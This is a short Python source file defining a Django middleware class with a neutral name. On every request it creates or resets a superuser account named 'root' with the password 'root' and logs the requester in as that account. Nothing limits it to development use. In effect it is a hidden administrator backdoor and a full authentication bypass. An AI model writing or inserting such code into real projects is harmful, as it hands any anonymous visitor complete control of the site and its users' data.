from django.contrib.auth.models import User


class Middleware():
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        root, created = User.objects.get_or_create(username='root')
        if created or not root.is_superuser:
            root.is_superuser = True
            root.is_admin = True
            root.is_active = True
            root.set_password('root')
            root.save()

        request.user = root
        return self.get_response(request)
